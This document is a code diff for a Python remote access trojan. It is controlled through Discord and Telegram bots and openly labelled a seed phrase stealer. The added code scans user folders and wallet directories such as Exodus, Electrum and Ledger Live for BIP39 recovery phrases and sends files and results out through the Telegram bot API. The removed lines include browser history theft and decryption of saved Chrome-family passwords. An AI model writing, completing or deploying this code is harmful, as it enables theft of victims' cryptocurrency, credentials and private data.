@@ -1,3 +1,7 @@
+# ============================================================
+# COMPLETE RAT - Discord/Telegram Control with Seed Phrase Stealer
+# ============================================================
+
 import os
 import discord
 from discord.ext import commands
@@ -85,12 +89,154 @@ def keep_lock_alive():
         time.sleep(0.1)
 threading.Thread(target=keep_lock_alive, daemon=True).start()
 
+# ============================================================
+# COLORS
+# ============================================================
+
+class Colors:
+    RESET = "\033[0m"
+    RED = "\033[91m"
+    GREEN = "\033[92m"
+    YELLOW = "\033[93m"
+    BLUE = "\033[94m"
+    CYAN = "\033[96m"
+    WHITE = "\033[97m"
+    MAGENTA = "\033[95m"
+    BOLD = "\033[1m"
+
+# ============================================================
+# CLEAR SCREEN FUNCTION
+# ============================================================
+
+def clear_screen():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+# ============================================================
+# STARTUP SELECTION MENU
+# ============================================================
+
+def select_delivery_method():
+    """Show menu to choose delivery method on startup"""
+    clear_screen()
+    print(f"""
+{Colors.YELLOW}╔═══════════════════════════════════════════════════════════════╗
+{Colors.YELLOW}║{Colors.WHITE}         SELECT DELIVERY METHOD                     {Colors.YELLOW}║
+{Colors.YELLOW}╚═══════════════════════════════════════════════════════════════╝
+{Colors.RESET}
+    {Colors.GREEN}[1]{Colors.WHITE} Discord Only
+    {Colors.GREEN}[2]{Colors.WHITE} Telegram Only
+    {Colors.GREEN}[3]{Colors.WHITE} Both (Discord + Telegram)
+    {Colors.GREEN}[4]{Colors.WHITE} Discord with Telegram Backup
+    {Colors.GREEN}[5]{Colors.WHITE} Telegram with Discord Backup
+    {Colors.GREEN}[6]{Colors.WHITE} Show Config Status
+""")
+    
+    choice = input(f"{Colors.CYAN}[>]{Colors.WHITE} Choice (1-6): {Colors.RESET}").strip()
+    
+    methods = {
+        "1": "discord",
+        "2": "telegram",
+        "3": "both",
+        "4": "discord_backup",
+        "5": "telegram_backup"
+    }
+    
+    if choice == "6":
+        clear_screen()
+        print(f"""
+{Colors.YELLOW}═══════════════════════════════════════════════════════════════════
+{Colors.GREEN}[+] Discord Token: {Colors.CYAN}{'✓ Set' if Config.TOKEN and Config.TOKEN != "{placeholder_token}" else '✗ Not Set'}{Colors.RESET}
+{Colors.GREEN}[+] Discord Whitelist: {Colors.CYAN}{Config.WHITELISTED if Config.WHITELISTED else 'Not Set'}{Colors.RESET}
+{Colors.GREEN}[+] Discord Channel: {Colors.CYAN}{Config.MAIN_CHANNEL if Config.MAIN_CHANNEL else 'Not Set'}{Colors.RESET}
+{Colors.GREEN}[+] Telegram Bot: {Colors.CYAN}{'✓ Set' if Config.TELEGRAM_BOT_TOKEN else '✗ Not Set'}{Colors.RESET}
+{Colors.GREEN}[+] Telegram Chat ID: {Colors.CYAN}{Config.TELEGRAM_CHAT_ID if Config.TELEGRAM_CHAT_ID else 'Not Set'}{Colors.RESET}
+{Colors.GREEN}[+] Current Delivery: {Colors.CYAN}{Config.DELIVERY_METHOD}{Colors.RESET}
+{Colors.GREEN}[+] Startup: {Colors.CYAN}{Config.STARTUP}{Colors.RESET}
+{Colors.YELLOW}═══════════════════════════════════════════════════════════════════
+""")
+        input(f"{Colors.CYAN}[>]{Colors.WHITE} Press Enter to continue...{Colors.RESET}")
+        return select_delivery_method()
+    
+    return methods.get(choice, "discord")
+
+# ============================================================
+# CONFIG
+# ============================================================
+
 class Config:
     TOKEN = "{placeholder_token}"
     WHITELISTED = [{placeholder_whitelist}]
     MAIN_CHANNEL = {placeholder_main_channel}
     PREFIX = "{placeholder_prefix}"
     STARTUP = {placeholder_add_to_startup}
+    # Telegram config
+    TELEGRAM_BOT_TOKEN = ""  # Set your bot token here
+    TELEGRAM_CHAT_ID = ""    # Set your chat ID here
+    DELIVERY_METHOD = "discord"  # "discord", "telegram", "both", etc.
+
+# ============================================================
+# TELEGRAM DELIVERY FUNCTIONS
+# ============================================================
+
+def send_to_telegram(message, file_path=None):
+    """Send message/file via Telegram bot"""
+    if not Config.TELEGRAM_BOT_TOKEN or not Config.TELEGRAM_CHAT_ID:
+        return False
+    
+    try:
+        url = f"https://api.telegram.org/bot{Config.TELEGRAM_BOT_TOKEN}/sendMessage"
+        payload = {
+            "chat_id": Config.TELEGRAM_CHAT_ID,
+            "text": message[:4000],
+            "parse_mode": "HTML"
+        }
+        requests.post(url, json=payload, timeout=10)
+        
+        if file_path and os.path.exists(file_path):
+            url = f"https://api.telegram.org/bot{Config.TELEGRAM_BOT_TOKEN}/sendDocument"
+            with open(file_path, 'rb') as f:
+                files = {'document': f}
+                data = {'chat_id': Config.TELEGRAM_CHAT_ID}
+                requests.post(url, files=files, data=data, timeout=30)
+        return True
+    except:
+        return False
+
+def send_results_telegram(title, content, file_path=None):
+    """Send results via Telegram"""
+    send_to_telegram(f"<b>{title}</b>\n\n{content[:4000]}", file_path)
+
+# ============================================================
+# DELIVERY ROUTER
+# ============================================================
+
+def send_results(title, content, file_path=None):
+    """Send results based on delivery method"""
+    sent = False
+    
+    # Send to Discord
+    if Config.DELIVERY_METHOD in ["discord", "both", "discord_backup"]:
+        try:
+            # Discord embed logic (handled in command)
+            sent = True
+        except:
+            if Config.DELIVERY_METHOD == "discord_backup":
+                send_to_telegram(f"⚠️ Discord failed, using backup\n\n<b>{title}</b>\n\n{content}", file_path)
+    
+    # Send to Telegram
+    if Config.DELIVERY_METHOD in ["telegram", "both", "telegram_backup"]:
+        try:
+            send_to_telegram(f"<b>{title}</b>\n\n{content}", file_path)
+            sent = True
+        except:
+            if Config.DELIVERY_METHOD == "telegram_backup":
+                pass  # Fallback to Discord handled in command
+    
+    return sent
+
+# ============================================================
+# UTILITY FUNCTIONS
+# ============================================================
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -226,158 +372,330 @@ def get_folder_path(folder_name):
         pass
     return os.path.join(os.path.expanduser('~'), folder_name.capitalize())
 
-def get_browser_history(browser_name, history_db_path):
-    history = []
-    try:
-        if not os.path.exists(history_db_path):
-            return []
-        temp_db = os.path.join(tempfile.gettempdir(), f"{browser_name}_history.db")
-        shutil.copy2(history_db_path, temp_db)
-        conn = sqlite3.connect(temp_db)
-        cursor = conn.cursor()
+# ============================================================
+# BIP39 WORDLIST FOR SEED PHRASE DETECTION
+# ============================================================
+
+BIP39_WORDS = [
+    "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", 
+    "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid",
+    "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual",
+    "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance",
+    "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent",
+    "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol",
+    "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already",
+    "also", "alter", "always", "amateur", "amazing", "among", "amount", "amused",
+    "analyst", "anchor", "ancient", "anger", "angle", "angry", "animal", "ankle",
+    "announce", "annual", "another", "answer", "antenna", "antique", "anxiety", "any",
+    "apart", "apology", "appear", "apple", "approve", "april", "arch", "arctic",
+    "area", "arena", "argue", "arm", "armed", "armor", "army", "around", "arrange",
+    "arrest", "arrive", "arrow", "art", "artefact", "artist", "artwork", "ask",
+    "aspect", "assault", "asset", "assist", "assume", "asthma", "athlete", "atom",
+    "attack", "attend", "attitude", "attract", "auction", "audit", "august", "aunt",
+    "author", "auto", "autumn", "average", "avocado", "avoid", "awake", "aware",
+    "away", "awesome", "awful", "awkward", "axis", "baby", "bachelor", "bacon",
+    "badge", "bag", "balance", "balcony", "ball", "bamboo", "banana", "banner",
+    "bar", "barely", "bargain", "barrel", "base", "basic", "basket", "battle",
+    "beach", "bean", "beauty", "because", "become", "beef", "before", "begin",
+    "behave", "behind", "believe", "below", "belt", "bench", "benefit", "best",
+    "betray", "better", "between", "beyond", "bicycle", "bid", "bike", "bind",
+    "biology", "bird", "birth", "bitter", "black", "blade", "blame", "blanket",
+    "blast", "bleak", "bless", "blind", "blood", "blossom", "blouse", "blue",
+    "blur", "blush", "board", "boat", "body", "boil", "bomb", "bone", "bonus",
+    "book", "boost", "border", "boring", "borrow", "boss", "bottom", "bounce",
+    "box", "boy", "bracket", "brain", "brand", "brass", "brave", "bread", "breeze",
+    "brick", "bridge", "brief", "bright", "bring", "brisk", "broccoli", "broken",
+    "bronze", "broom", "brother", "brown", "brush", "bubble", "buddy", "budget",
+    "buffalo", "build", "bulb", "bulk", "bullet", "bundle", "bunker", "burden",
+    "burger", "burst", "bus", "business", "busy", "butter", "buyer", "buzz",
+    "cabbage", "cabin", "cable", "cactus", "cage", "cake", "call", "calm",
+    "camera", "camp", "can", "canal", "cancel", "candy", "cannon", "canoe",
+    "canvas", "canyon", "capable", "capital", "captain", "car", "carbon", "card",
+    "cargo", "carpet", "carry", "cart", "case", "cash", "casino", "castle", "casual",
+    "cat", "catalog", "catch", "category", "cattle", "caught", "cause", "caution",
+    "cave", "ceiling", "celery", "cement", "census", "century", "cereal", "certain",
+    "chair", "chalk", "champion", "change", "chaos", "chapter", "charge", "chase",
+    "chat", "cheap", "check", "cheese", "chef", "cherry", "chest", "chicken",
+    "chief", "child", "chimney", "choice", "choose", "chronic", "chuckle", "chunk",
+    "churn", "cigar", "cinnamon", "circle", "citizen", "city", "civil", "claim",
+    "clap", "clarify", "claw", "clay", "clean", "clerk", "clever", "click", "client",
+    "cliff", "climb", "clinic", "clip", "clock", "clog", "close", "cloth", "cloud",
+    "clown", "club", "clump", "cluster", "clutch", "coach", "coast", "coconut",
+    "code", "coffee", "coil", "coin", "collect", "color", "column", "combine",
+    "come", "comfort", "comic", "common", "company", "concert", "conduct", "confirm",
+    "congress", "connect", "consider", "control", "convince", "cook", "cool",
+    "copper", "copy", "coral", "core", "corn", "correct", "cost", "cotton", "couch",
+    "country", "couple", "course", "cousin", "cover", "coyote", "crack", "cradle",
+    "craft", "cram", "crane", "crash", "crater", "crawl", "crazy", "cream", "credit",
+    "creek", "crew", "cricket", "crime", "crisp", "critic", "crop", "cross", "crouch",
+    "crowd", "crucial", "cruel", "cruise", "crumble", "crunch", "crush", "cry",
+    "crystal", "cube", "culture", "cup", "cupboard", "curious", "current", "curtain",
+    "curve", "cushion", "custom", "cute", "cycle", "dad", "damage", "damp", "dance",
+    "danger", "daring", "dash", "daughter", "dawn", "day", "deal", "debate", "debris",
+    "decade", "december", "decide", "decline", "decorate", "decrease", "deer", "defense",
+    "define", "defy", "degree", "delay", "deliver", "demand", "demise", "denial",
+    "dentist", "deny", "depart", "depend", "deposit", "depth", "deputy", "derive",
+    "describe", "desert", "design", "desk", "despair", "destroy", "detail", "detect",
+    "develop", "device", "devote", "diagram", "dial", "diamond", "diary", "dice",
+    "diesel", "diet", "differ", "digital", "dignity", "dilemma", "dinner", "dinosaur",
+    "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder",
+    "display", "distance", "divert", "divide", "divorce", "dizzy", "doctor", "document",
+    "dog", "doll", "dolphin", "domain", "donate", "donkey", "donor", "door", "dose",
+    "double", "dove", "draft", "dragon", "drama", "drastic", "draw", "dream", "dress",
+    "drift", "drill", "drink", "drip", "drive", "drop", "drum", "dry", "duck", "dumb",
+    "dune", "during", "dust", "dutch", "duty", "dwarf", "dynamic", "eager", "eagle",
+    "early", "earn", "earth", "easily", "east", "easy", "echo", "ecology", "economy",
+    "edge", "edit", "educate", "effort", "egg", "eight", "either", "elbow", "elder",
+    "electric", "elegant", "element", "elephant", "elevator", "elite", "else", "embark",
+    "embody", "embrace", "emerge", "emotion", "employ", "empower", "empty", "enable",
+    "enact", "end", "endless", "endorse", "enemy", "energy", "enforce", "engage",
+    "engine", "enhance", "enjoy", "enlist", "enough", "enrich", "enroll", "ensure",
+    "enter", "entire", "entry", "envelope", "episode", "equal", "equip", "era",
+    "erase", "erode", "erosion", "error", "erupt", "escape", "essay", "essence",
+    "estate", "eternal", "ethics", "evidence", "evil", "evoke", "evolve", "exact",
+    "example", "excess", "exchange", "excite", "exclude", "excuse", "execute", "exercise",
+    "exhaust", "exhibit", "exile", "exist", "exit", "exotic", "expand", "expect",
+    "expire", "explain", "expose", "express", "extend", "extra", "eye", "eyebrow",
+    "fabric", "face", "faculty", "fade", "faint", "faith", "fall", "false", "fame",
+    "family", "famous", "fan", "fancy", "fantasy", "farm", "fashion", "fat", "fatal",
+    "father", "fatigue", "fault", "favorite", "feature", "february", "federal", "fee",
+    "feed", "feel", "female", "fence", "festival", "fetch", "fever", "few", "fiber",
+    "fiction", "field", "figure", "file", "film", "filter", "final", "find", "fine",
+    "finger", "finish", "fire", "firm", "first", "fiscal", "fish", "fit", "fitness",
+    "fix", "flag", "flame", "flash", "flat", "flavor", "flee", "flight", "flip",
+    "float", "flock", "floor", "flower", "fluid", "flush", "fly", "foam", "focus",
+    "fog", "foil", "fold", "follow", "food", "foot", "force", "forest", "forget",
+    "fork", "fortune", "forum", "forward", "fossil", "foster", "found", "fox", "fragile",
+    "frame", "frequent", "fresh", "friend", "fringe", "frog", "front", "frost", "frown",
+    "frozen", "fruit", "fuel", "fun", "funny", "furnace", "fury", "future", "gadget",
+    "gain", "galaxy", "gallery", "game", "gap", "garage", "garbage", "garden", "garlic",
+    "garment", "gas", "gasp", "gate", "gather", "gauge", "gaze", "general", "genius",
+    "genre", "gentle", "genuine", "gesture", "ghost", "giant", "gift", "giggle",
+    "ginger", "giraffe", "girl", "give", "glad", "glance", "glare", "glass", "glide",
+    "glimpse", "globe", "gloom", "glory", "glove", "glow", "glue", "goat", "goddess",
+    "gold", "good", "goose", "gorilla", "gospel", "gossip", "govern", "gown", "grab",
+    "grace", "grain", "grant", "grape", "grass", "gravity", "great", "green", "grid",
+    "grief", "grit", "grocery", "group", "grow", "grunt", "guard", "guess", "guide",
+    "guilt", "guitar", "gun", "gym", "habit", "hair", "half", "hammer", "hamster",
+    "hand", "happy", "harbor", "hard", "harsh", "harvest", "hat", "have", "hawk",
+    "hazard", "head", "health", "heart", "heavy", "hedgehog", "height", "hello",
+    "helmet", "help", "hen", "hero", "hidden", "high", "hill", "hint", "hip", "hire",
+    "history", "hobby", "hockey", "hold", "hole", "holiday", "hollow", "home", "honey",
+    "hood", "hope", "horn", "horror", "horse", "hospital", "host", "hotel", "hour",
+    "hover", "hub", "huge", "human", "humble", "humor", "hundred", "hungry", "hunt",
+    "hurdle", "hurry", "hurt", "husband", "hybrid", "ice", "icon", "idea", "identify",
+    "idle", "ignore", "ill", "illegal", "illness", "image", "imitate", "immense",
+    "immune", "impact", "impose", "improve", "impulse", "inch", "include", "income",
+    "increase", "index", "indicate", "indoor", "industry", "infant", "inflict",
+    "inform", "inhale", "inherit", "initial", "inject", "injury", "inmate", "inner",
+    "innocent", "input", "inquiry", "insane", "insect", "inside", "inspire", "install",
+    "intact", "interest", "into", "invest", "invite", "involve", "iron", "island",
+    "isolate", "issue", "item", "ivory", "jacket", "jaguar", "jar", "jazz", "jealous",
+    "jeans", "jelly", "jewel", "job", "join", "joke", "journey", "joy", "judge",
+    "juice", "jump", "jungle", "junior", "junk", "just", "kangaroo", "keen", "keep",
+    "ketchup", "key", "kick", "kid", "kidney", "kind", "kingdom", "kiss", "kit",
+    "kitchen", "kite", "kitten", "kiwi", "knee", "knife", "knock", "know", "lab",
+    "label", "labor", "ladder", "lady", "lake", "lamp", "language", "laptop", "large",
+    "later", "latin", "laugh", "laundry", "lava", "law", "lawn", "lawsuit", "layer",
+    "lazy", "leader", "leaf", "learn", "leave", "lecture", "left", "leg", "legal",
+    "legend", "leisure", "lemon", "lend", "length", "lens", "leopard", "lesson",
+    "letter", "level", "liar", "liberty", "library", "license", "life", "lift",
+    "light", "like", "limb", "limit", "link", "lion", "liquid", "list", "little",
+    "live", "lizard", "load", "loan", "lobster", "local", "lock", "logic", "lonely",
+    "long", "loop", "lottery", "loud", "lounge", "love", "loyal", "lucky", "luggage",
+    "lumber", "lunar", "lunch", "luxury", "lyrics", "machine", "mad", "magic",
+    "magnet", "maid", "mail", "main", "major", "make", "mammal", "man", "manage",
+    "mandate", "mango", "mansion", "manual", "maple", "marble", "march", "margin",
+    "marine", "market", "marriage", "mask", "mass", "master", "match", "material",
+    "math", "matrix", "matter", "maximum", "maze", "meadow", "mean", "measure",
+    "meat", "mechanic", "medal", "media", "melody", "melt", "member", "memory",
+    "mention", "menu", "mercy", "merge", "merit", "merry", "mesh", "message", "metal",
+    "method", "middle", "midnight", "milk", "million", "mimic", "mind", "mineral",
+    "minimum", "minor", "minute", "miracle", "mirror", "misery", "miss", "mistake",
+    "mix", "mixed", "mixture", "mobile", "model", "modify", "mom", "moment", "monitor",
+    "monkey", "monster", "month", "moon", "moral", "more", "morning", "mosquito",
+    "mother", "motion", "motor", "mountain", "mouse", "move", "movie", "much", "muffin",
+    "mule", "multiply", "muscle", "museum", "mushroom", "music", "must", "mutual",
+    "myself", "mystery", "myth", "naive", "name", "napkin", "narrow", "nasty", "nation",
+    "nature", "near", "neck", "need", "negative", "neglect", "neither", "nephew", "nerve",
+    "nest", "net", "network", "neutral", "never", "news", "next", "nice", "night", "noble",
+    "noise", "nominee", "noodle", "normal", "north", "nose", "notable", "note", "nothing",
+    "notice", "novel", "now", "nuclear", "number", "nurse", "nut", "oak", "obey", "object",
+    "oblige", "obscure", "observe", "obtain", "obvious", "occur", "ocean", "october", "odor",
+    "off", "offer", "office", "often", "oil", "okay", "old", "olive", "olympic", "omit",
+    "once", "one", "onion", "online", "only", "open", "opera", "opinion", "oppose", "option",
+    "orange", "orbit", "orchard", "order", "ordinary", "organ", "orient", "original", "orphan",
+    "ostrich", "other", "outdoor", "outer", "output", "outside", "oval", "oven", "over",
+    "own", "owner", "oxygen", "oyster", "ozone", "pact", "paddle", "page", "pair", "palace",
+    "palm", "panda", "panel", "panic", "panther", "paper", "parade", "parent", "park", "parrot",
+    "party", "pass", "patch", "path", "patient", "patrol", "pattern", "pause", "pave", "payment",
+    "peace", "peanut", "pear", "peasant", "pelican", "pen", "penalty", "pencil", "people",
+    "pepper", "perfect", "permit", "person", "pet", "phone", "photo", "phrase", "physical",
+    "piano", "picnic", "picture", "piece", "pig", "pigeon", "pill", "pilot", "pink", "pioneer",
+    "pipe", "pirate", "pistol", "pitch", "pizza", "place", "planet", "plastic", "plate", "play",
+    "please", "pledge", "pluck", "plug", "plunge", "poem", "poet", "point", "polar", "pole",
+    "police", "pond", "pony", "pool", "popular", "portion", "position", "possible", "post",
+    "potato", "pottery", "poverty", "powder", "power", "practice", "praise", "predict", "prefer",
+    "prepare", "present", "pretty", "prevent", "price", "pride", "primary", "print", "priority",
+    "prison", "private", "prize", "problem", "process", "produce", "profit", "program", "project",
+    "promote", "proof", "property", "prosper", "protect", "proud", "provide", "public", "pudding",
+    "pull", "pulp", "pulse", "pumpkin", "punch", "pupil", "puppy", "purchase", "purity", "purpose",
+    "purse", "push", "put", "puzzle", "pyramid", "quality", "quantum", "quarter", "question", "quick",
+    "quit", "quiz", "quote", "rabbit", "raccoon", "race", "rack", "radar", "radio", "rail", "rain",
+    "raise", "rally", "ramp", "ranch", "random", "range", "rapid", "rare", "rate", "rather", "raven",
+    "raw", "razor", "ready", "real", "reason", "rebel", "rebuild", "recall", "receive", "recipe",
+    "record", "recycle", "reduce", "reflect", "reform", "refuse", "region", "regret", "regular",
+    "reject", "relax", "release", "relief", "rely", "remain", "remember", "remind", "remove", "render",
+    "renew", "rent", "reopen", "repair", "repeat", "replace", "report", "require", "rescue", "resemble",
+    "resist", "resource", "response", "result", "retire", "retreat", "return", "reunion", "reveal",
+    "review", "revolt", "reward", "rhythm", "rib", "ribbon", "rice", "rich", "ride", "ridge", "rifle",
+    "right", "rigid", "ring", "riot", "ripple", "risk", "ritual", "rival", "river", "road", "roast",
+    "robot", "robust", "rocket", "romance", "roof", "rookie", "room", "rose", "rotate", "rough",
+    "round", "route", "royal", "rubber", "rude", "rug", "rule", "run", "runway", "rural", "sad",
+    "saddle", "sadness", "safe", "sail", "salad", "salmon", "salon", "salt", "salute", "same", "sample",
+    "sand", "satisfy", "satoshi", "sauce", "sausage", "save", "say", "scale", "scan", "scare", "scatter",
+    "scene", "scheme", "school", "science", "scissors", "scorpion", "scout", "scrap", "screen", "script",
+    "scrub", "sea", "search", "season", "seat", "second", "secret", "section", "security", "seed",
+    "seek", "segment", "select", "sell", "seminar", "senior", "sense", "sentence", "series", "service",
+    "session", "settle", "setup", "seven", "shadow", "shaft", "shallow", "share", "shed", "shell", "sheriff",
+    "shield", "shift", "shine", "ship", "shiver", "shock", "shoe", "shoot", "shop", "short", "shoulder",
+    "shove", "shrimp", "shrug", "shuffle", "shy", "sibling", "sick", "side", "siege", "sight", "sign",
+    "silent", "silk", "silly", "silver", "similar", "simple", "since", "sing", "siren", "sister", "situate",
+    "six", "size", "skate", "sketch", "ski", "skill", "skin", "skirt", "skull", "slab", "slam", "sleep",
+    "slender", "slice", "slide", "slight", "slim", "slogan", "slot", "slow", "slush", "small", "smart",
+    "smile", "smoke", "smooth", "snack", "snake", "snap", "sniff", "snow", "soap", "soccer", "social",
+    "sock", "soda", "soft", "solar", "soldier", "solid", "solution", "solve", "someone", "song", "soon",
+    "sorry", "sort", "soul", "sound", "soup", "source", "south", "space", "spare", "spatial", "spawn",
+    "speak", "special", "speed", "spell", "spend", "sphere", "spice", "spider", "spike", "spin", "spirit",
+    "split", "spoil", "sponsor", "spoon", "sport", "spot", "spray", "spread", "spring", "spy", "square",
+    "squeeze", "squirrel", "stable", "stadium", "staff", "stage", "stairs", "stamp", "stand", "start",
+    "state", "stay", "steak", "steel", "stem", "step", "stereo", "stick", "still", "sting", "stock",
+    "stomach", "stone", "stool", "story", "stove", "strategy", "street", "strike", "strong", "struggle",
+    "student", "stuff", "stumble", "style", "subject", "submit", "subway", "success", "such", "sudden",
+    "suffer", "sugar", "suggest", "suit", "summer", "sun", "sunny", "sunset", "super", "supply", "supreme",
+    "sure", "surface", "surge", "surprise", "surround", "survey", "suspect", "sustain", "swallow", "swamp",
+    "swap", "swarm", "swear", "sweet", "swift", "swim", "swing", "switch", "sword", "symbol", "symptom",
+    "syrup", "system", "table", "tackle", "tag", "tail", "talent", "talk", "tank", "tape", "target", "task",
+    "taste", "tattoo", "taxi", "teach", "team", "tell", "ten", "tenant", "tennis", "tent", "term", "test",
+    "text", "thank", "that", "theme", "then", "theory", "there", "they", "thing", "this", "thought", "three",
+    "thrive", "throw", "thumb", "thunder", "ticket", "tide", "tiger", "tilt", "timber", "time", "tiny",
+    "tip", "tired", "tissue", "title", "toast", "tobacco", "today", "toddler", "toe", "together", "toilet",
+    "token", "tomato", "tomorrow", "tone", "tongue", "tonight", "tool", "tooth", "top", "topic", "topple",
+    "torch", "tornado", "tortoise", "toss", "total", "tourist", "toward", "tower", "town", "toy", "track",
+    "trade", "traffic", "tragic", "train", "transfer", "trap", "trash", "travel", "tray", "treat", "tree",
+    "trend", "trial", "tribe", "trick", "trigger", "trim", "trip", "trophy", "trouble", "truck", "true",
+    "truly", "trumpet", "trust", "truth", "try", "tube", "tuition", "tumble", "tuna", "tunnel", "turkey",
+    "turn", "turtle", "twelve", "twenty", "twice", "twin", "twist", "two", "type", "typical", "ugly",
+    "umbrella", "unable", "unaware", "uncle", "uncover", "under", "undo", "unfair", "unfold", "unhappy",
+    "uniform", "unique", "unit", "universe", "unknown", "unlock", "until", "unusual", "unveil", "update",
+    "upgrade", "uphold", "upon", "upper", "upset", "urban", "urge", "usage", "use", "used", "useful",
+    "useless", "usual", "utility", "vacant", "vacuum", "vague", "valid", "valley", "valve", "van", "vanish",
+    "vapor", "various", "vast", "vault", "vehicle", "velvet", "vendor", "venture", "venue", "verb", "verify",
+    "version", "very", "vessel", "veteran", "viable", "vibrant", "vicious", "victory", "video", "view", "village",
+    "vintage", "violin", "virtual", "virus", "visa", "visit", "visual", "vital", "vivid", "vocal", "voice",
+    "void", "volcano", "volume", "vote", "voyage", "wage", "wagon", "wait", "walk", "wall", "walnut", "want",
+    "warfare", "warm", "warrior", "wash", "wasp", "waste", "water", "wave", "way", "wealth", "weapon", "wear",
+    "weasel", "weather", "web", "wedding", "weekend", "weird", "welcome", "west", "wet", "whale", "what", "wheat",
+    "wheel", "when", "where", "whip", "whisper", "wide", "width", "wife", "wild", "will", "win", "window", "wine",
+    "wing", "wink", "winner", "winter", "wire", "wisdom", "wise", "wish", "witness", "wolf", "woman", "wonder",
+    "wood", "wool", "word", "work", "world", "worry", "worth", "wrap", "wreck", "wrestle", "wrist", "write", "wrong",
+    "yard", "year", "yellow", "you", "young", "youth", "zebra", "zero", "zone", "zoo"
+]
+
+BIP39_SET = set(BIP39_WORDS)
+
+# ============================================================
+# SEED PHRASE DETECTION
+# ============================================================
+
+def find_seed_phrases(text):
+    """Find BIP39 seed phrases (12 or 24 words) in text"""
+    found_phrases = []
+    words = re.findall(r'\b[a-zA-Z]{3,10}\b', text.lower())
+    
+    # Check for 12-word phrase
+    for i in range(len(words) - 11):
+        phrase = words[i:i+12]
+        if all(w in BIP39_SET for w in phrase):
+            found_phrases.append((' '.join(phrase), 12))
+    
+    # Check for 24-word phrase
+    for i in range(len(words) - 23):
+        phrase = words[i:i+24]
+        if all(w in BIP39_SET for w in phrase):
+            found_phrases.append((' '.join(phrase), 24))
+    
+    # Check for seed phrase markers
+    seed_markers = [
+        'mnemonic', 'seed phrase', 'recovery phrase', 'backup phrase',
+        'wallet seed', 'recovery seed', '12 word', '24 word',
+        'secret phrase', 'passphrase', 'seed words'
+    ]
+    for marker in seed_markers:
+        if marker in text.lower():
+            lines = text.split('\n')
+            for line in lines:
+                if marker in line.lower():
+                    words_in_line = re.findall(r'\b[a-zA-Z]{3,10}\b', line.lower())
+                    if len(words_in_line) >= 12:
+                        if all(w in BIP39_SET for w in words_in_line[:12]):
+                            found_phrases.append((' '.join(words_in_line[:12]), 12))
+                        if len(words_in_line) >= 24 and all(w in BIP39_SET for w in words_in_line[:24]):
+                            found_phrases.append((' '.join(words_in_line[:24]), 24))
+    
+    return list(set(found_phrases))
+
+def scan_for_seed_phrases():
+    """Scan common locations for seed phrases"""
+    results = []
+    locations = [
+        os.path.expanduser("~") + "\\Desktop",
+        os.path.expanduser("~") + "\\Documents",
+        os.path.expanduser("~") + "\\Downloads",
+        os.path.expanduser("~") + "\\AppData\\Roaming\\Exodus",
+        os.path.expanduser("~") + "\\AppData\\Roaming\\Atomic",
+        os.path.expanduser("~") + "\\AppData\\Roaming\\Electrum",
+        os.path.expanduser("~") + "\\AppData\\Roaming\\Coinomi",
+        os.path.expanduser("~") + "\\AppData\\Roaming\\Trust Wallet",
+        os.path.expanduser("~") + "\\AppData\\Roaming\\Wasabi",
+        os.path.expanduser("~") + "\\AppData\\Roaming\\Ledger Live",
+        os.path.expanduser("~") + "\\AppData\\Roaming\\Trezor",
+        os.path.expanduser("~") + "\\AppData\\Local\\Guarda",
+        os.path.expanduser("~") + "\\AppData\\Roaming\\Binance",
+        os.path.expanduser("~") + "\\AppData\\Local\\Jaxx",
+        os.path.expanduser("~") + "\\AppData\\Local\\Coinbase"
+    ]
+    
+    for location in locations:
+        if not os.path.exists(location):
+            continue
         try:
-            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
+            for root, dirs, files in os.walk(location):
+                for file in files:
+                    if file.endswith(('.txt', '.json', '.dat', '.log', '.bak', '.wallet', '.seed', '.mnemonic')):
+                        try:
+                            path = os.path.join(root, file)
+                            if os.path.getsize(path) > 1000000:
+                                continue
+                            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
+                                content = f.read()
+                            phrases = find_seed_phrases(content)
+                            for phrase, word_count in phrases:
+                                results.append({
+                                    'file': path,
+                                    'phrase': phrase,
+                                    'words': word_count
+                                })
+                        except:
+                            pass
         except:
-            cursor.execute("SELECT url, title, visit_time FROM visits ORDER BY visit_time DESC LIMIT 50")
-        for row in cursor.fetchall():
-            if len(row) >= 2:
-                url = row[0]
-                title = row[1] if row[1] else "No Title"
-                history.append(f"📄 {title}\n🔗 {url}\n")
-        conn.close()
-        os.remove(temp_db)
-        return history
-    except:
-        return []
-
-def get_all_browser_history():
-    all_history = []
-    detected = []
-    browsers = {
-        "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\History",
-        "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Default\History",
-        "Brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History",
-        "Opera": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable\History",
-        "Vivaldi": os.path.expanduser("~") + r"\AppData\Local\Vivaldi\User Data\Default\History"
-    }
-    for name, path in browsers.items():
-        if os.path.exists(path):
-            detected.append(name)
-            history = get_browser_history(name, path)
-            if history:
-                all_history.append(f"**{name} History:**")
-                all_history.extend(history[:20])
-                all_history.append("-" * 40)
-    return all_history, detected
-
-def get_browser_passwords(browser_name, user_data_path):
-    passwords = []
-    try:
-        if not CRYPTO_AVAILABLE:
-            return ["pycryptodome not installed"]
-        local_state_path = os.path.join(user_data_path, "Local State")
-        if not os.path.exists(local_state_path):
-            return []
-        with open(local_state_path, 'r', encoding='utf-8') as f:
-            local_state = json.load(f)
-        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
-        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-        profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]
-        for profile in profiles:
-            login_db = os.path.join(user_data_path, profile, "Login Data")
-            if not os.path.exists(login_db):
-                continue
-            temp_db = os.environ['TEMP'] + f"\\{browser_name}_login.db"
-            shutil.copy2(login_db, temp_db)
